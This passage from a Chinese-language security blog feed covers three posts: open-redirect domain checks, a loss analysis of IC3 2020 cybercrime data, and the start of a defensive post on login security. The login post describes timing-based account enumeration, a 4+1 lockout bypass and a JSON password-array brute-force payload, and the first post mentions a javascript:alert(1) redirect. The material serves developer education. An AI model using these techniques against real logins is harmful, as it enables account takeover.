true&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;validateDomain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;https://dev.cymetrics.io&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// true&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這是在檢查 domain 時滿常會犯的錯誤，因為沒有考慮到以下兩種情形：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://cymetrics.io.huli.tw/&quot;&gt;cymetrics.io.huli.tw&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://fakecymetrics.io/&quot;&gt;fakecymetrics.io&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;上面這兩種情形都符合條件，但卻不是我們想要的結果。&lt;/p&gt;
&lt;p&gt;其實不只是檢查 domain，在做任何檢查的時候用 &lt;code&gt;includes&lt;/code&gt; 或是 &lt;code&gt;contains&lt;/code&gt; 直接去看整體是否包含某個字串都是一件比較危險的事情。最好的方式其實是設一個 allow list 並且要完全一致才通過，這樣是最嚴格的。但如果想要允許所有 subdomain 的話，可以這樣檢查：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; validDomain &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;cymetrics.io&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;validateDomain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; host &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;hostname &lt;span class=&quot;token comment&quot;&gt;// 取出 hostname&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; host &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; validDomain &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; host&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;endsWith&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;.&#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; validDomain&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;subdomain 的部分結尾要是 &lt;code&gt;.cymetrics.io&lt;/code&gt;，所以一定會是 &lt;a href=&quot;http://cymetrics.io/&quot;&gt;cymetrics.io&lt;/a&gt; 的 subdomain，而主要的 domain 也要完全符合才可以。不過這樣寫的話，如果某一個不相干的 subdomain 有 open redirect 的漏洞，這段就破功了。因此還是建議大家只把確定會 redirect 的 domain 放進去並且直接用 &lt;code&gt;===&lt;/code&gt; 做檢查，避免這種狀況發生。&lt;/p&gt;
&lt;h2 id=&quot;%E7%B5%90%E8%AA%9E&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AA%9E&quot;&gt;#&lt;/a&gt; 結語&lt;/h2&gt;
&lt;p&gt;重新導向是個很常見的功能，最常見的就是登入前點了某個連結之後轉到登入頁面，登入成功就會自動跳轉回去。在做這個功能時，如果是前端重新導向，再次提醒大家，要考慮到 &lt;code&gt;window.location = &#39;javascript:alert(1)&#39;&lt;/code&gt; 這樣會出事，請確認重新導向的 URL 是合法的 URL 再做動作。另外，也要確認檢查 domain 時有考慮到可能會被繞過的狀況，盡可能用最嚴謹的方式去處理。&lt;/p&gt;
&lt;p&gt;以上就是對 open redirect 的介紹，希望對大家有幫助，有什麼疑問或是寫錯的地方都可以在下面留言跟我討論。&lt;/p&gt;
&lt;p&gt;參考資料：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.detectify.com/2019/05/16/the-real-impact-of-an-open-redirect/&quot;&gt;The real impact of an Open Redirect vulnerability&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.intigriti.com/hackademy/open-redirect/&quot;&gt;Intigriti: Open Redirect&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://gauravnarwani.com/misconfigured-oauth-to-account-takeover/&quot;&gt;Misconfigured OAuth leading to Account Takeover&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://s0cket7.com/open-redirect-vulnerability/&quot;&gt;Open Redirect Vulnerability&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://devcraft.io/2020/10/19/github-gist-account-takeover.html&quot;&gt;GitHub Gist - Account takeover via open redirect - $10,000 Bounty&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover&quot;&gt;OAuth to Account takeover&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

		</content>
	</entry>
	
	<entry>
		<title>資安弱點會造成多大損失 ?</title>
		<link href="https://tech-blog.cymetrics.io/posts/nick/cybersecurity-loss/"/>
		<updated>2021-09-09T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/nick/cybersecurity-loss/</id>
		<content type="html">
		  &lt;h1 id=&quot;%E8%B3%87%E5%AE%89%E5%BC%B1%E9%BB%9E%E6%9C%83%E9%80%A0%E6%88%90%E5%A4%9A%E5%A4%A7%E6%90%8D%E5%A4%B1-%3F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%B3%87%E5%AE%89%E5%BC%B1%E9%BB%9E%E6%9C%83%E9%80%A0%E6%88%90%E5%A4%9A%E5%A4%A7%E6%90%8D%E5%A4%B1-%3F&quot;&gt;#&lt;/a&gt; 資安弱點會造成多大損失 ?&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/cybersecurity-loss/cl_1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;當碰到資安問題時，會馬上跟著遇到另一個難題，就是這個問題到底要不要修 ? 就像得感冒的時候可能會考慮不吃藥忍一忍，賭自己的身體夠健康，但如果中的是 Covid-19 肯定不會猶豫要不要買藥，只會擔心買不到藥，畢竟兩者的嚴重性差太多了。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;嚴重性是在發現問題時決定要不要處理的關鍵，這通常由發生機率與影響程度來決定，本文要帶大家試著從另外一個角度來看，從過去資安事件造成的損失來評估問題的嚴重性。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;h2 id=&quot;%E8%B3%87%E6%96%99%E4%BE%86%E6%BA%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%B3%87%E6%96%99%E4%BE%86%E6%BA%90&quot;&gt;#&lt;/a&gt; 資料來源&lt;/h2&gt;
&lt;p&gt;在分析之前先簡單介紹一下引用的資料的來源，因為資安事件中包含很多敏感資訊，一般的狀況下取得詳細資料較為困難。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;機構名稱: IC3(Internet Crime Complaint Center)&lt;/li&gt;
&lt;li&gt;官方網址: &lt;a href=&quot;https://www.ic3.gov/&quot;&gt;https://www.ic3.gov/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;簡介:&lt;br&gt;
IC3 是 聯邦調查局 (FBI) 旗下的組織，也是美國最大的資安通報系統，主要提供一個可靠、方便的報告機制，以便向聯邦調查局(FBI) 提交與網路犯罪有關的資訊，IC3 在藉由這些資料進行調查與通知相關執法機構。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;%E5%88%86%E6%9E%90%E6%AF%94%E8%BC%83&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%88%86%E6%9E%90%E6%AF%94%E8%BC%83&quot;&gt;#&lt;/a&gt; 分析比較&lt;/h2&gt;
&lt;h3 id=&quot;1.-%E5%8E%9F%E5%A7%8B%E5%A0%B1%E5%91%8A%3A-ic3-annual-report&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#1.-%E5%8E%9F%E5%A7%8B%E5%A0%B1%E5%91%8A%3A-ic3-annual-report&quot;&gt;#&lt;/a&gt; 1. 原始報告: IC3 Annual Report&lt;/h3&gt;
&lt;p&gt;IC3 統計了網路犯罪所造成的金額損失，並以犯罪手法的方式來分類。&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/cybersecurity-loss/cl_2.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;center style=&quot;font-size:14px;color:#C0C0C0;text-decoration:underline&quot;&gt;https://www.ic3.gov/Media/PDF/AnnualReport/2020_IC3Report.pdf&lt;/center&gt;
&lt;br&gt;
&lt;p&gt;從這張表格中我們可以看出前三名分別是&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;BEC/EAC：&lt;/strong&gt;&lt;br&gt;
透過電子郵件對匯款或付款資訊進行詐騙，使被害者匯錢到攻擊者的帳戶，BEC 指的是攻擊對象為公司，EAC 則是針對個人。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Confidence Fraud/Romance：&lt;/strong&gt;&lt;br&gt;
假裝成被害者信任的對象，讓被害者向攻擊者發送有價值的物品或資訊。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Investment：&lt;/strong&gt;&lt;br&gt;
誘使被害者根據虛假信息進行購買，通常以高報酬低風險來誘拐受害者。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;損失金額最高的 BEC/EAC 與電子郵件有最高的關聯性，如果要預防該問題必須要在郵件伺服器上做處理，接下來便以問題發生點來分析資安事件導致的金融損失&lt;/p&gt;
&lt;h3 id=&quot;2.-%E5%88%86%E6%9E%90%E5%A0%B1%E5%91%8A%3A-%E5%95%8F%E9%A1%8C%E9%BB%9E&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#2.-%E5%88%86%E6%9E%90%E5%A0%B1%E5%91%8A%3A-%E5%95%8F%E9%A1%8C%E9%BB%9E&quot;&gt;#&lt;/a&gt; 2. 分析報告: 問題點&lt;/h3&gt;
&lt;p&gt;這邊將資安問題藉由發生點分為四類，部分資安事件會有一個以上的類型。&lt;br&gt;
(ex. Phishing 可能發生在惡意郵件或釣魚網站)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;電子郵件&lt;/strong&gt; : 在攻擊者能成功寄電子郵件給被害者的狀況下可能發生的攻擊。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;帳號密碼&lt;/strong&gt; : 攻擊者知道被害者的帳號或密碼後可能發生的攻擊。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;網站&lt;/strong&gt; : 攻擊者對被害者網站發動攻擊，或者反過來誘導被害者連到惡意網站。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;網路服務&lt;/strong&gt; : 在攻擊者接觸到被害者對外開放的服務(ex. FTP, SMB...)後可能發生的攻擊。&lt;/li&gt;
&lt;/ul&gt;
&lt;img data-deopt=&quot;true&quot; src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/cybersecurity-loss/cl_3.jpg&quot;&gt;
&lt;p&gt;所以我們可以從這張圖看出，在 2020 年有超過一半的損失是來自電子郵件未做好保護，損失第二高的是來自網站漏洞，剩下的一成則是由帳號密碼外流與對外開放網路服務的所導致。&lt;/p&gt;
&lt;h2 id=&quot;%E7%B5%90%E8%AB%96&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AB%96&quot;&gt;#&lt;/a&gt; 結論&lt;/h2&gt;
&lt;img data-deopt=&quot;true&quot; src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/cybersecurity-loss/cl_4.jpg&quot;&gt;
&lt;p&gt;接著分享一下如果要遇防問題發生該怎麼做。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;電子郵件&lt;/strong&gt; : 3240 million&lt;br&gt;
要預防與電子郵件有關的資安問題有兩個主要目標，第一是降低收到惡意郵件的機會，做好郵件伺服器的設定，或者直接選用高安全性的郵件服務，第二是降地惡意信件的影響，建議進行社交工程演練，從中學習收到可疑郵件的處理流程，降低發生率跟影響之後，安全等級自然會上升。&lt;/p&gt;
&lt;p&gt;如果要做郵件伺服器的設定，又不知道從何開始，可以參考技術部落格的另一篇文章。&lt;br&gt;
&lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory/&quot;&gt;關於 email security 的大小事 — 原理篇&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;網站&lt;/strong&gt; : 1749 million&lt;br&gt;
要提升網站的資安等級則建議先檢查有沒有常見問題，像是 Owasp Top 10 或是 Cwe Top 25，藉由增加駭客的攻擊成本，降低駭客對自家網站的興趣，接著等到有時間和預算後找第三方廠商做一次完整的滲透測試，由專業的資安團隊來檢查網站有沒有問題，避免球員兼裁判導致疏漏。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;帳號密碼&lt;/strong&gt; : 349 million&lt;br&gt;
要確保帳號密碼安全則有三件事要注意&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用高強度的密碼，降低暴力破解可能性&lt;/li&gt;
&lt;li&gt;定期更換密碼，縮短密碼外流後攻擊的有效時間&lt;/li&gt;
&lt;li&gt;避免同一組帳密用在不同的地方，減少帳密外流後的影響範圍。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;這邊推薦一個網站可以查詢自己的帳號密碼是否已經外流&lt;br&gt;
&lt;a href=&quot;https://haveibeenpwned.com/&quot;&gt;have i been pwned?&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;網路服務&lt;/strong&gt; : 188 million&lt;br&gt;
先檢查自己的設備對外開放了哪些服務，在檢查服務的版本，有這兩個資訊後就可以到 &lt;a href=&quot;https://www.cvedetails.com/&quot;&gt;CVE Detail&lt;/a&gt; 查詢服務的弱點，如果有弱點的話盡快升級到安全的版本，如果沒辦法升級，可以考慮利用 VPN 將這些對外服務轉成對內服務，避免駭客有直接利用這些弱點的機會。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;

		</content>
	</entry>
	
	<entry>
		<title>被盜帳號是誰的錯？聊聊 Authentication</title>
		<link href="https://tech-blog.cymetrics.io/posts/crystal/authentication/"/>
		<updated>2021-09-16T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/crystal/authentication/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;p&gt;『身份驗證機制遭破解』聽起來很技術，但『盜帳號』大家應該就都很有感了。沒錯，盜帳號不只是朋友之間惡搞的玩笑，而是真實世界駭客入侵手法最大宗沒有之一。那麼，被盜帳號是誰的錯呢？&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;先想想你都怎麼盜朋友帳號的吧。&lt;/p&gt;
&lt;p&gt;有可能是趁他去上廁所的時候偷發文，也有可能是他用學校電腦卻忘了登出，更有可能的是『啊他就萬年一組帳號啊，不就是名字加生日嘛』。&lt;/p&gt;
&lt;p&gt;沒錯，使用弱密碼的確是帳號被破解最大的原因之一。弱密碼不只是 qwerty monkey iloveyou 這種隨便一個字典檔就可以在半小時內爆開的常見字串，還包含跟個資相關，用名字、生日、電話、親朋好友的資訊組合而成的字串。就算你在前後多加一個驚嘆號或數字，對駭客來說也只是多花一分鐘就能破解的。而一旦破獲一組帳密，你的多個帳號大概也跟著淪陷了，畢竟，大多數人都是一兩組密碼打天下而且從來不更換的，就算會換也通常有某種規律，例如從 iamhappy1 變 iamhappy12 再到 iamhappy123。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2014/11/social-media-account-hacked.jpg&quot;&gt;&lt;figcaption&gt;&lt;p&gt;image from &lt;a href=&quot;https://www.avira.com/en/blog/hacked-social-media-account&quot;&gt;Avira&lt;/a&gt;&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;你可能覺得，駭客哪會這麼了解我？的確，駭客可能不『認識』你，但別忘了，你在社群軟體上的貼文留言、你的朋友清單、你在別的網站或問券上無意留下的資料，全都是駭客秘密搜集的拼圖碎片！有了這麼多數位足跡，要知道你的出生年月日、國小國中高中學號、常去的店跟要好的朋友，可是易如反掌呢！&lt;/p&gt;
&lt;p&gt;但如果不讓你用這些跟你相關的資訊，要求你每個登入頁面都要用完全不同的 10 位亂數當密碼，你記得住嗎？&lt;/p&gt;
&lt;p&gt;根據密碼管理軟體 &lt;a href=&quot;https://www.techradar.com/reviews/nordpass&quot;&gt;NordPass&lt;/a&gt; 統計，一個人平均有 100 組密碼。也就是說，在不使用密碼管理軟體的情況下，你必須腦袋裡牢牢記住 100 個毫不相干的 10 位亂數。而就算你使用了密碼管理軟體來儲存這 100 個亂數，如果你的 master password 本身還是弱密碼，那駭客只要破解它就可以獲得你全部的密碼了。&lt;/p&gt;
&lt;p&gt;可見對大多數人來說，完全不使用弱密碼顯然不是可行的做法。那我們還能從哪裡防止『盜帳號』呢？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;回想前面的情境，會發生『被盜帳號』通常是因為使用了能被預測跟列舉嘗試的密碼，既然難以杜絕『被預測』的可能，我們至少可以往『被列舉嘗試』這邊防堵。&lt;br&gt;
如果攻擊者沒辦法透過登入頁面的反應來知道攻擊是否成功，或是只有少少的幾次機會可以嘗試，那只要密碼不是最直覺最好猜的那幾組就能暫時躲過一劫。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;注意，這裡說的暫時是指駭客沒辦法非常快速輕鬆的破解你的密碼，但如果你在多個服務都重複使用同一組密碼，那只要有夠多網站就會累積夠多機會讓駭客多花一點時間撞到正確的那一組！&lt;/p&gt;
&lt;p&gt;作為開發者，該如何防範『帳號密碼被列舉嘗試』呢？讓我們看看一個經典範例。&lt;/p&gt;
&lt;h2 id=&quot;%E9%96%8B%E7%99%BC%E8%80%85%E8%88%87%E9%A7%AD%E5%AE%A2%E7%9A%84%E8%A7%92%E5%8A%9B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%96%8B%E7%99%BC%E8%80%85%E8%88%87%E9%A7%AD%E5%AE%A2%E7%9A%84%E8%A7%92%E5%8A%9B&quot;&gt;#&lt;/a&gt; 開發者與駭客的角力&lt;/h2&gt;
&lt;p&gt;小明是個新手工程師，學成後興沖沖加入一個團隊開發電商平台，負責管理客戶登入跟設定的模組。不過半年，電商平台大獲好評，使用者每個月都以倍數成長，小明覺得錢途光明，非常有成就感。結果兩天後在新聞上看到：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;驚！知名電商平台洩漏大量個資！&lt;br&gt;
傳出知名電商平台遭駭，竟有高達 300000 筆客戶資訊於暗網拋售，內容包含信用卡、消費紀錄等資訊，受害範圍遍佈歐洲亞洲等數十國家，其中不乏知名廠商。據相關人士於 twitter 透露，由於平台登入頁面存在弱點，駭客以暴力破解獲取多組帳密資訊，包含某管理員權限帳號，進而得以竊取大量個資。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;小明馬上找來長期接觸資安的好友阿柚諮詢，阿柚一看先問實作邏輯。小明非常困惑，不就是把使用者輸入的帳號拿去查一下資料庫，如果有這個使用者再去查一次密碼嗎？如果查無此使用者，畫面上就會顯示『帳號錯誤』，密碼不對就會顯示『密碼錯誤』，教學文章不都是這樣做的嗎？&lt;/p&gt;
&lt;p&gt;阿柚直搖頭，列出三大罪狀：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先查帳號再查密碼&lt;/li&gt;
&lt;li&gt;錯誤訊息太明確&lt;/li&gt;
&lt;li&gt;沒有任何登入次數限制&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;看著小明一臉問號，阿柚娓娓道來：&lt;/p&gt;
&lt;h3 id=&quot;%E5%85%88%E6%9F%A5%E5%B8%B3%E8%99%9F%E5%86%8D%E6%9F%A5%E5%AF%86%E7%A2%BC&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%85%88%E6%9F%A5%E5%B8%B3%E8%99%9F%E5%86%8D%E6%9F%A5%E5%AF%86%E7%A2%BC&quot;&gt;#&lt;/a&gt; 先查帳號再查密碼&lt;/h3&gt;
&lt;p&gt;先查帳號再查密碼看似合理，畢竟這樣才能跟用戶說到底是哪一個打錯了嘛！但這個做法其實也透露給駭客：一個帳號存不存在，跟查幾次資料庫有關。而大家應該都知道查詢資料庫其實是很花時間的，所以在假設其他程式邏輯都相同的情況下，查兩次資料庫跟查一次應該有回覆速度上明顯的差異。&lt;/p&gt;
&lt;p&gt;因此，如果我拿一百個帳號去嘗試登入，結果發現其中一個頁面回覆的的時間是其他的兩倍，那我就可以推論，這個帳號既然用了兩次資料庫查詢，那他應該是存在的吧？&lt;/p&gt;
&lt;p&gt;利用這個瑕疵，駭客就可以拿一個很大的帳號名單逐一嘗試登入，然後透過回覆速度判斷資料庫裡面存在哪些帳號，再利用過濾完的帳號名單第二次暴力破解使用弱密碼的用戶。不出意外，小明用的後台管理帳號名稱就是最直觀的 admin，當然一下就被字典檔發現啦！&lt;/p&gt;
&lt;h3 id=&quot;%E9%8C%AF%E8%AA%A4%E8%A8%8A%E6%81%AF%E5%A4%AA%E6%98%8E%E7%A2%BA&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%8C%AF%E8%AA%A4%E8%A8%8A%E6%81%AF%E5%A4%AA%E6%98%8E%E7%A2%BA&quot;&gt;#&lt;/a&gt; 錯誤訊息太明確&lt;/h3&gt;
&lt;p&gt;小明惱了，debug message 不清不楚成何體統，使用者怎麼知道哪裡打錯？沒錯，當你把錯誤訊息寫得越精確，你輕鬆、使用者輕鬆、駭客更輕鬆。他甚至也不用管實作邏輯是不是會有回應速度上的差異，只要單純根據錯誤訊息就知道到底是帳號錯還是密碼錯，輕輕鬆鬆列舉所有的帳號！&lt;/p&gt;
&lt;p&gt;從資安的觀點來講，錯誤訊息應該盡可能籠統，例如任何登入錯誤都用『帳號密碼錯誤』或『您輸入的資訊有誤』帶過，讓駭客更難判斷攻擊是否成功。&lt;/p&gt;
&lt;h3 id=&quot;%E6%B2%92%E6%9C%89%E4%BB%BB%E4%BD%95%E7%99%BB%E5%85%A5%E9%99%90%E5%88%B6&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%B2%92%E6%9C%89%E4%BB%BB%E4%BD%95%E7%99%BB%E5%85%A5%E9%99%90%E5%88%B6&quot;&gt;#&lt;/a&gt; 沒有任何登入限制&lt;/h3&gt;
&lt;p&gt;最大的問題，就是沒有針對『嘗試登入』這個舉動做任何限制！因為任何人都可以輕易地對網站做無限多次的登入嘗試，概念上就像買樂透一樣，你把每一種可能的組合都包牌買下來總是會中大獎的吧？那為什麼我們還要努力工作，不能走進彩券行大手一揮全包下來？因為包牌的成本遠超過中獎的獎金，這個行為的期望值太低了，不值得我們這樣做。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;同理，對暴力破解來說，最根本的解決方法就是增加駭客的成本，讓他要花的時間跟資源大到暴力破解變得不可行，就能有效抵擋這種攻擊。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;聽了阿柚的解說，小明打開 log 一看，發現從一個 IP 12.34.56.78 發了將近百萬個登入的 request，瞬間恍然大悟『那我只要限制每個 IP 如果連續五次請求都打錯密碼就鎖帳號，這樣就可以了吧！』。&lt;/p&gt;
&lt;p&gt;阿柚想了想，再搖搖頭，這個做法還是有邏輯錯誤。&lt;/p&gt;
&lt;h3 id=&quot;%E7%99%BB%E5%85%A5%E9%82%8F%E8%BC%AF%E9%8C%AF%E8%AA%A4&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%99%BB%E5%85%A5%E9%82%8F%E8%BC%AF%E9%8C%AF%E8%AA%A4&quot;&gt;#&lt;/a&gt; 登入邏輯錯誤&lt;/h3&gt;
&lt;p&gt;因為鎖帳號的邏輯是『連續五次錯誤』，所以駭客可以先註冊一組帳號，然後每試四次就成功登入自己的帳號一次，打破『連續』的條件，這樣 4+1 的方法不斷重複一樣可以繞過小明的限制達到暴力破解。再者，如果是在帳號密碼分開查詢資料庫的實作下，駭客還可以用 4+1 搭配前面提過的時間判斷法來列舉平台上的帳號。因此以來源 IP 為判斷對象鎖帳號的邏輯其實無法阻止駭客的攻擊。&lt;/p&gt;
&lt;p&gt;而且眼尖的阿柚還發現，登入用的 POST 請求居然允許使用 JSON 格式的 post data：&lt;/p&gt;
&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token property&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token property&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這樣根本不用發大量請求，只要把大量的密碼們一次用 array 的方式送過去，如果裡面有一組正確的就可以直接登入啦！&lt;/p&gt;
&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token property&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token property&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token string&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token string&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token string&quot;&gt;&quot;pass123&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token string&quot;&gt;&quot;iloveyou&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token string&quot;&gt;&quot;letmein&quot;&lt;/span&gt;&lt;br&gt;        ...&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;小明沉思許久，要考慮的事情真多呀！不只要看登入格式，還要限制每個帳戶登入失敗幾次就要鎖住，而且錯誤訊息跟資料庫查詢方式都要調整，真是大工程。&lt;/p&gt;
&lt;p&gt;不過既然頭都洗下去了，不如再給他做個最近正流行的 2FA 吧！&lt;/p&gt;
&lt;h3 id=&quot;2fa&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#2fa&quot;&gt;#&lt;/a&gt; 2FA&lt;/h3&gt;
&lt;p&gt;2FA (2 factor authentication) 翻譯為雙因素驗證，也就是輸入正確的帳號密碼後還必須透過 email 或簡訊的方式再驗證一次，都過了才算登入成功。廣義來說為一種 MFA (multiple factor authentication)，或多因素驗證，為了防止單一驗證方法被破解而延伸的多層防線戰術。&lt;/p&gt;
